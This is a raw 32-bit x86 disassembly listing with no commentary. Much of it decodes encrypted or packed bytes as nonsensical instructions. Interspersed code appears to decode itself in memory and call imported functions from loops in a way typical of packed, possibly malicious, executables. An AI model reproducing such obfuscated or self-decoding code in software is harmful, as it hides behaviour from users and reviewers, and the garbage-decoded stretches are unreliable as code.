  406305:	inc    esp
  406306:	or     esp,DWORD PTR [ebx+0x5a40f782]
  40630c:	stos   BYTE PTR es:[edi],al
  40630d:	cmp    edi,DWORD PTR [esi+0x3e]
  406310:	xlat   BYTE PTR ds:[ebx]
  406311:	sub    eax,0x8cfb093
  406316:	mov    esi,0x4f6087d2
  40631b:	push   edx
  40631c:	cmp    esp,DWORD PTR [esi]
  40631e:	loop   0x40632f
  406320:	inc    esi
  406321:	ins    BYTE PTR es:[edi],dx
  406322:	test   DWORD PTR [eax],0x54d5d040
  406328:	out    0x77,eax
  40632a:	jle    0x406353
  40632c:	adc    BYTE PTR [ebx-0x6bd07d91],al
  406332:	jb     0x406341
  406334:	adc    al,0xeb
  406336:	jnp    0x406310
  406338:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406339:	push   esi
  40633a:	xor    BYTE PTR [ecx],bl
  40633c:	out    0xa7,eax
  40633e:	mov    ah,0x41
  406340:	push   ebx
  406341:	mov    WORD PTR [eax-0x14d6e66a],ss
  406347:	out    dx,eax
  406348:	cli    
  406349:	scas   al,BYTE PTR es:[edi]
  40634a:	lods   eax,DWORD PTR ds:[esi]
  40634b:	popf   
  40634c:	test   ah,al
  40634e:	xchg   esi,eax
  40634f:	pop    ecx
  406350:	fisttp QWORD PTR [esi+edi*2+0x6c]
  406354:	inc    edi
  406355:	xchg   ebx,eax
  406356:	ret    
  406357:	add    al,0x2
  406359:	pop    esp
  40635a:	sahf   
  40635b:	push   eax
  40635c:	mov    ds:0x30a79038,eax
  406361:	retf   
  406362:	xor    eax,DWORD PTR [esi]
  406364:	cmp    BYTE PTR [esi],0xd
  406367:	cmc    
  406368:	add    al,0xc7
  40636a:	inc    ebx
  40636b:	mov    ebx,DWORD PTR [edi-0x7e]
  40636e:	loop   0x4063d4
  406370:	inc    ebx
  406371:	jg     0x406319
  406373:	or     bl,BYTE PTR [eax]
  406375:	jge    0x406360
  406377:	out    dx,eax
  406378:	imul   ecx,DWORD PTR fs:[ebp+ebx*4+0x40829e54],0xd0dae170
  406384:	in     eax,0x6
  406386:	pop    edx
  406387:	sbb    eax,0x6c36fed3
  40638c:	stc    
  40638d:	fidivr WORD PTR [edi+0x21]
  406390:	add    al,0x14
  406392:	sbb    BYTE PTR [ebx+0x77fb79c5],0x17
  406399:	aad    0xfe
  40639b:	mov    ebx,0xeffbb3bb
  4063a0:	pop    ebx
  4063a1:	jp     0x4063c5
  4063a3:	jp     0x40640c
  4063a5:	sub    DWORD PTR [ebx+0x7f9d5cac],ebp
  4063ab:	sub    al,0xb3
  4063ad:	fcomp  QWORD PTR [edx+0x4bb45694]
  4063b3:	push   edi
  4063b4:	lock mov esi,edi
  4063b7:	add    al,0xff
  4063b9:	jne    0x4063af
  4063bb:	push   DWORD PTR [ebp-0x14]
  4063be:	jmp    0x4065b6
  4063c3:	push   edi
  4063c4:	mov    bh,BYTE PTR [esi+0x51514381]
  4063ca:	dec    eax
  4063cb:	sub    DWORD PTR [eax],eax
  4063cd:	enter  0xbde0,0x82
  4063d1:	cmp    bh,BYTE PTR [ecx-0x2c]
  4063d4:	xor    DWORD PTR [esi+0x7e],edi
  4063d7:	push   ebp
  4063d8:	jg     0x406458
  4063da:	jle    0x40639c
  4063dc:	hlt    
  4063dd:	mov    eax,0xe17462d6
  4063e2:	(bad)  
  4063e3:	shr    BYTE PTR [edx+0x44],cl
  4063e6:	out    dx,eax
  4063e7:	mov    eax,ds:0x11c39151
  4063ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063ed:	fadd   QWORD PTR [ebx]
  4063ef:	les    edx,FWORD PTR [ebx]
  4063f1:	xor    DWORD PTR [ebp+0x384ab7a0],esi
  4063f7:	mov    al,ds:0xbf07e87b
  4063fc:	popf   
  4063fd:	cmp    eax,0x73c73ff0
  406402:	loopne 0x4063d9
  406404:	shl    eax,1
  406406:	popa   
  406407:	fidiv  WORD PTR [ecx]
  406409:	push   eax
  40640a:	mov    ch,0x2c
  40640c:	xor    eax,0x83d2259e
  406411:	jno    0x4063b4
  406413:	shl    BYTE PTR [ecx+0x1c11bad8],1
  406419:	sub    al,0x21
  40641b:	mov    edx,0x27364f0d
  406420:	mov    eax,ds:0xfd5611d3
  406425:	mov    ?,ecx
  406427:	xchg   esp,eax
  406428:	mov    eax,ds:0x5acfeb3d
  40642d:	popw   es
  40642f:	test   DWORD PTR [edi+0x76],eax
  406432:	adc    al,0x39
  406434:	rcl    esp,0x77
  406437:	or     eax,0x33c78b1c
  40643c:	dec    edi
  40643d:	inc    eax
  40643e:	jbe    0x4063c5
  406440:	push   ecx
  406441:	aaa    
  406442:	push   ecx
  406443:	push   eax
  406444:	sub    BYTE PTR [ebx+0x13e9133d],dl
  40644a:	jne    0x4064c3
  40644c:	call   0x5d68:0x1f7cd4f2
  406453:	adc    DWORD PTR [ebx],0x8d587103
  406459:	test   eax,0xaf0c0d6e
  40645e:	(bad)  [edi]
  406460:	aaa    
  406461:	loop   0x40642e
  406463:	sar    DWORD PTR [ecx+0x2c],0x2
  406467:	or     BYTE PTR [ecx+0x24],bh
  40646a:	imul   ebx,DWORD PTR [esi-0x15],0x97a2deaf
  406471:	loopne 0x40642d
  406473:	sub    bl,dh
  406475:	or     eax,0xa2b067de
  40647a:	les    edi,FWORD PTR [ebp+0x73]
  40647d:	xor    dl,BYTE PTR [edx-0x45d50c54]
  406483:	test   al,0xb3
  406485:	lds    esi,FWORD PTR [esi]
  406487:	mov    ebx,0xd28e2c1e
  40648c:	lahf   
  40648d:	mov    bl,0xd1
  40648f:	outs   dx,BYTE PTR ds:[esi]
  406490:	mov    ebp,0xab780a7
  406495:	xor    al,BYTE PTR [edx+0x4d]
  406498:	cmp    eax,DWORD PTR [ebx]
  40649a:	sbb    al,0x8d
  40649c:	pop    ecx
  40649d:	sar    BYTE PTR [ecx-0x79],1
  4064a0:	and    BYTE PTR [edi+0x404d8349],bh
  4064a6:	jo     0x4064ad
  4064a8:	test   eax,0x5d0474bf
  4064ad:	sbb    DWORD PTR [edi+0x1e027047],esp
  4064b3:	frstor [edi]
  4064b5:	das    
  4064b6:	xor    dh,BYTE PTR [edi]
  4064b8:	add    eax,0xa8a439f2
  4064bd:	stc    
  4064be:	and    eax,DWORD PTR [ebx]
  4064c0:	aam    0x29
  4064c2:	xchg   edx,eax
  4064c3:	scas   eax,DWORD PTR es:[edi]
  4064c4:	in     eax,dx
  4064c5:	xor    BYTE PTR [esp+ebx*1-0x1d],bh
  4064c9:	xor    BYTE PTR [ecx-0x51],0x2c
  4064cd:	call   0x722e:0x871c5627
  4064d4:	mov    edx,0x516f22b7
  4064d9:	dec    edi
  4064da:	scas   al,BYTE PTR es:[edi]
  4064db:	mov    bh,0xd3
  4064dd:	pop    esp
  4064de:	jmp    0x44c:0x17668b98
  4064e5:	dec    ebx
  4064e6:	adc    al,cl
  4064e8:	mov    bl,0xf7
  4064ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064eb:	pushf  
  4064ec:	retf   0xd3ab
  4064ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064f0:	mov    WORD PTR [esi+0x267d7c0c],?
  4064f6:	push   ds
  4064f7:	hlt    
  4064f8:	add    ebp,eax
  4064fa:	mov    bl,BYTE PTR [ebp-0x17]
  4064fd:	xlat   BYTE PTR ds:[ebx]
  4064fe:	sub    bh,BYTE PTR [esi-0x25]
  406501:	mov    BYTE PTR [eax+0x70],bh
  406504:	ret    
  406505:	in     al,0x8b
  406507:	push   ecx
  406508:	sub    BYTE PTR [ebx+0xc],al
  40650b:	hlt    
  40650c:	rcl    BYTE PTR [edx-0x23],cl
  40650f:	pop    ebp
  406510:	popaw  
  406512:	xor    al,0x8
  406514:	adc    DWORD PTR [esi],0xa97decfb
  40651a:	bound  ecx,QWORD PTR [ecx]
  40651c:	in     eax,0xfc
  40651e:	add    eax,edi
  406520:	lds    edx,FWORD PTR [eax]
  406522:	mov    al,ds:0xf0650eac
  406527:	xor    BYTE PTR [ebx+0x6b],bh
  40652a:	or     BYTE PTR [edi],0x6d
  40652d:	(bad)  
  40652e:	imul   edx,DWORD PTR [ebx+0x3e7c6fb7],0x6cee1c51
  406538:	(bad)
  40653b:	mov    dh,0x2a
  40653d:	jle    0x406587
  40653f:	imul   edx,ebp,0x44f35a5a
  406545:	sti    
  406546:	je     0x40650e
  406548:	sbb    al,0x5e
  40654a:	loope  0x406561
  40654c:	jno    0x4065b0
  40654e:	adc    eax,0xe01f545b
  406553:	inc    ebx
  406554:	push   0x51
  406556:	push   cs
  406557:	mov    ah,0xc3
  406559:	mov    al,ds:0xafee8e00
  40655e:	out    dx,al
  40655f:	mov    esi,0xb1bdce
  406564:	add    al,0x4d
  406566:	lock pop ecx
  406568:	mov    edi,0xd69ad96d
  40656d:	(bad)  
  40656e:	push   ebp
  40656f:	arpl   ax,sp
  406571:	push   eax
  406572:	ror    DWORD PTR ds:0xf020083a,0xa
  406579:	sbb    al,BYTE PTR [edi-0x6ef41d4a]
  40657f:	mov    dh,0x1b
  406581:	(bad)  
  406582:	out    dx,al
  406583:	pop    eax
  406584:	xchg   ecx,eax
  406585:	or     eax,0xb42092de
  40658a:	sub    ebx,DWORD PTR [eax+ebx*2]
  40658d:	aas    
  40658e:	fcmovnb st,st(6)
  406590:	dec    ecx
  406591:	das    
  406592:	mov    ah,0xb2
  406594:	gs jae 0x406518
  406597:	pusha  
  406598:	test   al,0x4a
  40659a:	mov    ds:0xe50c77c1,eax
  40659f:	xchg   ebp,eax
  4065a0:	(bad)  
  4065a1:	(bad)  
  4065a2:	sbb    al,al
  4065a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065a5:	xchg   edx,eax
  4065a6:	add    DWORD PTR [edx+0x10],ebx
  4065a9:	xlat   BYTE PTR ds:[ebx]
  4065aa:	jle    0x4065d6
  4065ac:	out    dx,al
  4065ad:	inc    ecx
  4065ae:	or     eax,0x6cdceee7
  4065b3:	test   DWORD PTR [ebp-0x187117fb],esi
  4065b9:	(bad)  
  4065ba:	inc    DWORD PTR [ebp+0x25840fc0]
  4065c0:	add    BYTE PTR [eax],al
  4065c2:	add    BYTE PTR [ebp-0x74af77bb],cl
  4065c8:	inc    ebp
  4065c9:	in     al,dx
  4065ca:	xor    eax,esi
  4065cc:	add    eax,edi
  4065ce:	push   eax
  4065cf:	mov    eax,DWORD PTR [ebp-0x10]
  4065d2:	add    eax,0xee
  4065d7:	push   eax
  4065d8:	mov    eax,DWORD PTR [ebp-0x10]
  4065db:	mov    eax,DWORD PTR [eax+0x198]
  4065e1:	push   DWORD PTR [eax]
  4065e3:	call   0x40cdc5
  4065e8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4065eb:	xor    ecx,esi
  4065ed:	jmp    0x4067e5
  4065f2:	fwait
  4065f3:	imul   edx,eax,0x42
  4065f6:	shl    BYTE PTR [ecx-0x57],1
  4065f9:	jae    0x406585
  4065fb:	sbb    edi,DWORD PTR [edx+edx*1+0x70a3cb29]
  406602:	sub    edi,DWORD PTR [edi]
  406604:	jle    0x406684
  406606:	push   ebp
  406607:	jg     0x406687
  406609:	jle    0x4065fd
  40660b:	mov    al,0xab
  40660d:	lods   eax,DWORD PTR ds:[esi]
  40660e:	pslld  mm6,mm7
  406611:	out    dx,al
  406612:	imul   esi,DWORD PTR [edi],0xffffffdc
  406615:	scas   al,BYTE PTR es:[edi]
  406616:	jbe    0x406684
  406618:	sub    DWORD PTR ds:0x9457f6d2,ebx
  40661e:	test   BYTE PTR [ebx+0x3b],ah
  406621:	xlat   BYTE PTR ds:[ebx]
  406622:	xchg   ecx,eax
  406623:	sbb    DWORD PTR [edx-0x16abe673],edi
  406629:	repz jnp 0x40661c
  40662c:	mov    DWORD PTR [eax-0x363a5816],esp
  406632:	dec    eax
  406633:	jg     0x4065e8
  406635:	inc    ebp
  406636:	or     BYTE PTR [ecx-0x19],al
  406639:	xor    eax,0xda4e99d
  40663e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40663f:	lea    ecx,[eax]
  406641:	or     edx,DWORD PTR [esi-0x52]
  406644:	pop    ds
  406645:	(bad)  
  406646:	and    al,0xd7
  406648:	or     eax,0x73e1be71
  40664d:	mov    edx,0xd831e4c6
  406652:	dec    edi
  406653:	xchg   esp,eax
  406654:	call   0xad88:0x552aa42e
  40665b:	mov    ebp,0x24adb6ac
  406660:	das    
  406661:	cmp    DWORD PTR [ebx-0x1c0ae921],ebp
  406667:	pop    esp
  406668:	mov    dh,0x24
  40666a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40666b:	out    0xfe,al
  40666d:	ds into 
  40666f:	ror    BYTE PTR [ebx],0x12
  406672:	ins    BYTE PTR es:[edi],dx
  406673:	xor    al,0xa7
  406675:	les    ecx,FWORD PTR fs:[edi-0x214be7f]
  40667c:	mov    edx,0xb72c2ed3
  406681:	add    al,0x97
  406683:	inc    ecx
  406684:	cwde   
  406685:	sahf   
  406686:	aad    0x28
  406688:	in     eax,dx
  406689:	(bad)  
  40668a:	mov    ch,BYTE PTR [edx+0x2823022f]
  406690:	sbb    ecx,DWORD PTR [edx]
  406692:	cli    
  406693:	adc    eax,0x2e15ba16
  406698:	jne    0x406663
  40669a:	mov    BYTE PTR ds:0x178ef75b,dh
  4066a0:	cmp    BYTE PTR [edx],ah
  4066a2:	push   ds
  4066a3:	ja     0x40665d
  4066a5:	data16 addr16 mov ch,0x2b
  4066a9:	cmp    al,0xc
  4066ab:	repz sub edi,ecx
  4066ae:	mov    ebp,gs
  4066b0:	mov    edx,DWORD PTR [edi+0x6f]
  4066b3:	xor    dl,bh
  4066b5:	divps  xmm5,XMMWORD PTR [ebp-0x32]
  4066b9:	sbb    ecx,DWORD PTR [esi-0x27]
  4066bc:	stos   DWORD PTR es:[edi],eax
  4066bd:	jbe    0x4066b2
  4066bf:	jae    0x4066b1
  4066c1:	pop    ecx
  4066c2:	dec    esi
  4066c3:	pop    esi
  4066c4:	inc    ebp
  4066c5:	aaa    
  4066c6:	push   ebp
  4066c7:	cmp    BYTE PTR [ebx+edx*2+0x69a366b],0x98
  4066cf:	fcomi  st,st(5)
  4066d1:	mov    edi,DWORD PTR [edi]
  4066d3:	fs sbb al,0x78
  4066d6:	jnp    0x4066e6
  4066d8:	sub    BYTE PTR [esi],bl
  4066da:	cwde   
  4066db:	push   edx
  4066dc:	dec    ebx
  4066dd:	and    al,0xb3
  4066df:	aaa    
  4066e0:	pop    es
  4066e1:	cs xor al,0xfe
  4066e4:	out    dx,eax
  4066e5:	dec    ecx
  4066e6:	push   ebx
  4066e7:	adc    BYTE PTR [edi],bl
  4066e9:	in     eax,0x30
  4066eb:	adc    cl,BYTE PTR [edx+0x5aeab7b2]
  4066f1:	stos   DWORD PTR es:[edi],eax
  4066f2:	dec    esp
  4066f3:	scas   eax,DWORD PTR es:[edi]
  4066f4:	std    
  4066f5:	aad    0xa9
  4066f7:	rcl    BYTE PTR [ebx+0x2db4a9f2],cl
  4066fd:	dec    esi
  4066fe:	cs mov esp,0x480a644c
  406704:	adc    DWORD PTR ds:0x5b3f1d63,esi
  40670a:	dec    ebp
  40670b:	mov    bl,0x7a
  40670d:	mov    edi,0x8be1c070
  406712:	js     0x406783
  406714:	mov    dl,0x4f
  406716:	mov    bh,0xad
  406718:	lods   eax,DWORD PTR ds:[esi]
  406719:	push   edx
  40671a:	sar    BYTE PTR [ebp-0x2f603aca],1
  406720:	add    DWORD PTR [esi+edx*1],ecx
  406723:	xor    ecx,DWORD PTR [esi+ebp*1+0x6b]
  406727:	cs mov ecx,0x1c3c074f
  40672d:	dec    ecx
  40672e:	jmp    0x416557be
  406733:	std    
  406734:	mov    ecx,0xb5e11cca
  406739:	mov    al,ds:0x52b57f06
  40673e:	adc    ebp,DWORD PTR [edi+0x27]
  406741:	jnp    0x406730
  406743:	shl    DWORD PTR [eax-0x5cc6e895],1
  406749:	xor    eax,0xf009ebe0
  40674e:	arpl   WORD PTR [ebx-0x7fe3aea1],ax
  406754:	mov    ah,0x2e
  406756:	fadd   st(1),st
  406758:	cmp    eax,0xdb1ba082
  40675d:	mov    esp,0x8f86ffe1
  406762:	sti    
  406763:	clc    
  406764:	ja     0x40675d
  406766:	xchg   ebx,eax
  406767:	mov    esp,0x7b79ebcc
  40676c:	dec    esi
  40676d:	sar    BYTE PTR [eax],0x30
  406770:	inc    edx
  406771:	jmp    0x2c483ae1
  406776:	out    0xa2,al
  406778:	shl    BYTE PTR [ecx-0x38],0xdb
  40677c:	in     eax,dx
  40677d:	ret    
  40677e:	out    dx,al
  40677f:	and    ecx,DWORD PTR [esi]
  406781:	sub    al,0x4
  406783:	test   al,0x15
  406785:	(bad)  
  406786:	scas   al,BYTE PTR es:[edi]
  406787:	popa   
  406788:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406789:	call   0xd98faad1
  40678e:	add    BYTE PTR [edi-0x437c1001],ch
  406794:	adc    dh,BYTE PTR [esi]
  406796:	mov    ch,0xd
  406798:	inc    esi
  406799:	add    BYTE PTR [ecx-0x5c3369e1],0x88
  4067a0:	or     DWORD PTR [ebp-0x28bf7e24],esp
  4067a6:	jp     0x4067e4
  4067a8:	push   ecx
  4067a9:	retf   0xd37c
  4067ac:	xor    eax,DWORD PTR [ebp+0x6e]
  4067af:	ds push edx
  4067b1:	mov    eax,0xc8c28a94
  4067b6:	cdq    
  4067b7:	sub    BYTE PTR [esi],0xcc
  4067ba:	mov    dl,0xb7
  4067bc:	sub    BYTE PTR [esi],bh
  4067be:	pop    esp
  4067bf:	jle    0x4067d6
  4067c1:	jecxz  0x40678f
  4067c3:	jge    0x406749
  4067c5:	fcomi  st,st(0)
  4067c7:	loop   0x406848
  4067c9:	aad    0x4d
  4067cb:	loope  0x406830
  4067cd:	and    DWORD PTR [edi],0xffffffef
  4067d0:	popf   
  4067d1:	xchg   ecx,eax
  4067d2:	mov    ebp,0x4c1072ba
  4067d7:	sbb    BYTE PTR [edx+eax*4],bl
  4067da:	pop    ecx
  4067db:	jl     0x4067a6
  4067dd:	clc    
  4067de:	mov    ah,BYTE PTR [ebp+0x49c29dec]
  4067e4:	in     al,dx
  4067e5:	mov    eax,0xffcd8d65
  4067ea:	sub    eax,ecx
  4067ec:	sub    eax,DWORD PTR [ebp-0x8]
  4067ef:	mov    ecx,DWORD PTR [ebp-0x30]
  4067f2:	add    ecx,eax
  4067f4:	mov    eax,DWORD PTR [ebp-0x8]
  4067f7:	mov    DWORD PTR [eax+0x1],ecx
  4067fa:	mov    al,BYTE PTR [ebp-0x1]
  4067fd:	mov    ecx,DWORD PTR [ebp-0x8]
  406800:	xor    al,0x46
  406802:	sub    al,0x38
  406804:	mov    BYTE PTR [ecx],al
  406806:	lea    eax,[ebp-0x8]
  406809:	inc    BYTE PTR [eax]
  40680b:	inc    eax
  40680c:	push   eax
  40680d:	pop    ecx
  40680e:	dec    ecx
  40680f:	xchg   ecx,edx
  406811:	dec    BYTE PTR [edx]
  406813:	push   DWORD PTR [ebp-0x10]
  406816:	mov    eax,ds:0x412264
  40681b:	mov    eax,DWORD PTR [eax]
  40681d:	push   DWORD PTR [eax]
  40681f:	lea    eax,ds:0x412280
  406825:	push   DWORD PTR [eax]
  406827:	lea    eax,ds:0x41202c
  40682d:	push   DWORD PTR [eax]
  40682f:	lea    eax,ds:0x412260
  406835:	push   DWORD PTR [eax]
  406837:	lea    eax,ds:0x4122f4
  40683d:	push   DWORD PTR [eax]
  40683f:	xchg   ebx,edx
  406841:	inc    ebx
  406842:	inc    ebx
  406843:	sub    ebx,0x3
  406846:	push   ebx
  406847:	jmp    0x406a3f
  40684c:	xchg   edx,eax
  40684d:	lods   al,BYTE PTR ds:[esi]
  40684e:	sbb    eax,0x91ab211a
  406853:	mov    ah,0x54
  406855:	jmp    0x6435:0x7aa9f6f1
  40685c:	push   cs
  40685d:	cmp    eax,0x7f557e7e
  406862:	jle    0x4068e2
  406864:	clc    
  406865:	ror    BYTE PTR [ecx-0x22],1
  406868:	sub    edi,edx
  40686a:	sahf   
  40686b:	pop    ebp
  40686c:	inc    eax
  40686d:	or     eax,0x348b5cea
  406872:	neg    bh
  406874:	mov    al,0x41
  406876:	inc    edi
  406877:	imul   eax,DWORD PTR [eax-0x22],0xd392114f
  40687e:	in     eax,0xe1
  406880:	pop    ebp
  406881:	dec    edi
  406882:	cmp    BYTE PTR ds:0x7c096a26,bh
  406888:	fmul   DWORD PTR [eax+0x4ae263a5]
  40688e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40688f:	inc    ecx
  406890:	jg     0x40686e
  406892:	outs   dx,DWORD PTR ds:[esi]
  406893:	sbb    eax,0x38883d0d
  406898:	imul   edx,DWORD PTR [eax-0x4],0x1d8975e
  40689f:	loop   0x406852
  4068a1:	adc    BYTE PTR [ecx-0x57],bl
  4068a4:	shl    bl,1
  4068a6:	jmp    0x4068cc
  4068a8:	jmp    0x9b228cb7
  4068ad:	ror    BYTE PTR [ecx-0x11],1
  4068b0:	sbb    al,0x30
  4068b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068b3:	out    dx,al
  4068b4:	arpl   sp,cx
  4068b6:	sbb    BYTE PTR [ebx+ebp*4-0x7659e6d],ah
  4068bd:	lods   al,BYTE PTR ds:[esi]
  4068be:	shl    DWORD PTR [ecx+0x7b6cbd85],1
  4068c4:	cmp    bh,BYTE PTR [ecx+0x52]
  4068c7:	cmp    al,0x11
  4068c9:	cmp    dl,ah
  4068cb:	shr    DWORD PTR [ebp+0x6b800177],cl
  4068d1:	cld    
  4068d2:	into   
  4068d3:	sbb    DWORD PTR ds:0x6792d9bc,edx
  4068d9:	ds out 0xc4,eax
  4068dc:	retf   
  4068dd:	fldcw  WORD PTR [eax+0x4123538a]
  4068e3:	loope  0x4068d7
  4068e5:	mov    ss:0xc2128b8e,al
  4068eb:	inc    esi
  4068ec:	iret   
  4068ed:	mov    esi,ecx
  4068ef:	xor    al,0x83
  4068f1:	rol    ebp,1
  4068f3:	or     eax,0xfc5612e4
  4068f8:	mov    eax,ds:0x1b344c55
  4068fd:	mov    ebx,0xc81695aa
  406902:	dec    esp
  406903:	aam    0xb6
  406905:	xchg   esp,eax
  406906:	mov    esi,0x4fa85c55
  40690b:	mov    ebx,0x8aab9979
  406910:	sar    DWORD PTR [esi+0x7e5a6261],cl
  406916:	jae    0x4068b2
  406918:	jnp    0x406962
  40691a:	stc    
  40691b:	in     al,0xff
  40691d:	dec    esi
  40691e:	xchg   ecx,eax
  40691f:	mov    dh,0x16
  406921:	pusha  
  406922:	push   edx
  406923:	rcl    DWORD PTR [edi+0x52],0xc3
  406927:	cs push edi
  406929:	fst    DWORD PTR [eax-0x70ca487e]
  40692f:	jmp    0x406928
  406931:	scas   al,BYTE PTR es:[edi]
  406932:	scas   eax,DWORD PTR es:[edi]
  406933:	scas   al,BYTE PTR es:[edi]
  406934:	enter  0xaefc,0x0
  406938:	(bad)  
  406939:	xor    eax,0xdb620bb0
  40693e:	add    eax,0xa53ec8c9
  406943:	dec    eax
  406944:	popa   
  406945:	mov    ebp,0xe5b2ef7f
  40694a:	imul   edx,DWORD PTR [ebx*1-0xd29dc18],0xc360faea
  406955:	out    dx,eax
  406956:	xchg   DWORD PTR [ecx],eax
  406958:	dec    edx
  406959:	or     DWORD PTR [edx-0x18285f],eax
  40695f:	pop    eax
  406960:	mov    al,ds:0xb7f0116a
  406965:	sub    ch,BYTE PTR [ecx-0x33]
  406968:	cmp    esp,DWORD PTR [ebx+0x2179dd19]
  40696e:	sbb    eax,0x9e831eb1
  406973:	xchg   ebx,ebp
  406975:	jns    0x406976
  406977:	dec    edi
  406978:	dec    edi
  406979:	sub    BYTE PTR [ebp+0x3be07a83],dl
  40697f:	xor    ah,BYTE PTR [edi+0x4b]
  406982:	stos   DWORD PTR es:[edi],eax
  406983:	push   edi
  406984:	outs   dx,BYTE PTR ds:[esi]
  406985:	cli    
  406986:	aam    0xb8
  406988:	push   0x45546844
  40698d:	sub    eax,0xc550a9e3
  406992:	sbb    edx,DWORD PTR [ecx+0x5b]
  406995:	push   ss
  406996:	int    0x33
  406998:	cli    
  406999:	ds xchg ebp,eax
  40699b:	and    BYTE PTR [ecx-0xe1aa440],al
  4069a1:	pop    ds
  4069a2:	pop    ebp
  4069a3:	push   0x81bc2d8e
  4069a8:	xchg   DWORD PTR [edi-0x3898aea6],ebp
  4069ae:	mov    ecx,ebp
  4069b0:	inc    edx
  4069b1:	dec    ebx
  4069b2:	mov    ecx,0xba8f371b
  4069b7:	stc    
  4069b8:	dec    ebp
  4069b9:	imul   edi,DWORD PTR [ecx],0x9ac7ad21
  4069bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069c0:	leave  
  4069c1:	add    eax,0x29f0a1fd
  4069c6:	cmp    al,BYTE PTR [edi+0x23705b03]
  4069cc:	lods   al,BYTE PTR ds:[esi]
  4069cd:	jecxz  0x406a11
  4069cf:	pop    eax
  4069d0:	shr    BYTE PTR [ecx+ecx*8],0x3a
  4069d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069d5:	mov    ds:0x7c4e574e,eax
  4069da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069db:	lods   eax,DWORD PTR ds:[esi]
  4069dc:	(bad)  
  4069dd:	dec    esi
  4069de:	xchg   DWORD PTR [eax+0x63],edx
  4069e1:	jns    0x4069e0
  4069e3:	and    al,0x6e
  4069e5:	push   esi
  4069e6:	sbb    al,0xb3
  4069e8:	fistp  QWORD PTR [esi-0xda83366]
  4069ee:	int3   
  4069ef:	inc    bx
  4069f1:	jae    0x40698b
  4069f3:	sbb    ecx,eax
  4069f5:	jle    0x406987
  4069f7:	push   ds
  4069f8:	inc    ebx
  4069f9:	outs   dx,BYTE PTR ds:[esi]
  4069fa:	mov    al,BYTE PTR ds:0xe01f7047
  406a00:	inc    edi
  406a01:	mov    cl,0xb6
  406a03:	push   ds
  406a04:	test   BYTE PTR [esi],al
  406a06:	cmp    eax,0xb18d1e38
  406a0b:	and    al,0x21
  406a0d:	jl     0x4069f1
  406a0f:	cdq    
  406a10:	mov    cl,0x7f
  406a12:	stc    
  406a13:	adc    al,al
  406a15:	test   al,0xe7
  406a17:	xchg   ebp,eax
  406a18:	xchg   ecx,eax
  406a19:	pop    ebx
  406a1a:	(bad)  
  406a1c:	out    dx,al
  406a1d:	add    dh,BYTE PTR [ecx-0x52]
  406a20:	push   cs
  406a21:	and    bh,ch
  406a23:	aad    0xa
  406a25:	and    eax,edx
  406a27:	sahf   
  406a28:	xchg   esi,eax
  406a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406a2b:	mov    cl,BYTE PTR [ecx]
  406a2d:	pop    esp
  406a2e:	ja     0x406aad
  406a30:	inc    ecx
  406a31:	or     ch,BYTE PTR [ebx+0x2fdace7c]
  406a37:	xchg   BYTE PTR [ebx],dl
  406a39:	arpl   si,dx
  406a3b:	adc    ecx,DWORD PTR [eax+0x4e]
  406a3e:	jle    0x406a98
  406a40:	call   DWORD PTR [eax+0x1]
  406a43:	mov    eax,DWORD PTR [ebp-0x20]
  406a46:	mov    ecx,DWORD PTR ds:0x412224
  406a4c:	add    DWORD PTR [eax],ecx
  406a4e:	pop    edi
  406a4f:	pop    esi
  406a50:	pop    ebx
  406a51:	leave  
  406a52:	ret    
  406a53:	push   ebp
  406a54:	mov    ebp,esp
  406a56:	sub    esp,0x44
  406a59:	push   edi
  406a5a:	mov    DWORD PTR ds:0x42ec63,0x1a
  406a64:	cmp    DWORD PTR ds:0x42ec63,0x0
  406a6b:	je     0x406ab1
  406a71:	cmp    DWORD PTR ds:0x42ec63,0x25
  406a78:	jne    0x406a8a
  406a7e:	push   DWORD PTR [ebp-0x1c]
  406a81:	push   DWORD PTR [ebp-0x20]
  406a84:	call   DWORD PTR ds:0x42ea9b
  406a8a:	xor    edi,edi
  406a8c:	add    edi,DWORD PTR ds:0x42ec63
  406a92:	dec    edi
  406a93:	mov    DWORD PTR ds:0x42ec63,edi
  406a99:	jmp    0x406a64
  406a9e:	movzx  edi,BYTE PTR ds:0x430367
  406aa5:	xor    edi,DWORD PTR ds:0x4302b5
  406aab:	mov    DWORD PTR ds:0x430367,edi
  406ab1:	mov    eax,DWORD PTR [ebp+0xc]
  406ab4:	and    edx,edi
  406ab6:	mov    DWORD PTR [ebp-0x10],eax
  406ab9:	mov    eax,DWORD PTR [ebp+0x8]
  406abc:	and    DWORD PTR ds:0x4302dd,0x0
  406ac6:	mov    ecx,DWORD PTR ds:0x4302dd
  406acc:	inc    ecx
  406acd:	mov    DWORD PTR ds:0x4302dd,ecx
  406ad3:	cmp    DWORD PTR ds:0x4302dd,0x23
  406ada:	jne    0x406af9
  406ae0:	push   0x42e737
  406ae5:	push   DWORD PTR [ebp-0x28]
  406ae8:	push   DWORD PTR [ebp-0x28]
  406aeb:	push   0x2078
  406af0:	push   DWORD PTR [ebp-0x10]
  406af3:	call   DWORD PTR ds:0x42ea9f
  406af9:	cmp    DWORD PTR ds:0x4302dd,0x1c
  406b00:	jb     0x406ac6
  406b06:	or     edi,0x11f2
  406b0c:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  406b13:	mov    DWORD PTR ds:0x43035f,0x15
  406b1d:	cmp    DWORD PTR ds:0x43035f,0x0
  406b24:	je     0x406b57
  406b2a:	cmp    DWORD PTR ds:0x43035f,0x16
  406b31:	jne    0x406b3d
  406b37:	call   DWORD PTR ds:0x42e85f
  406b3d:	xor    ecx,ecx
  406b3f:	xor    ecx,DWORD PTR ds:0x43035f
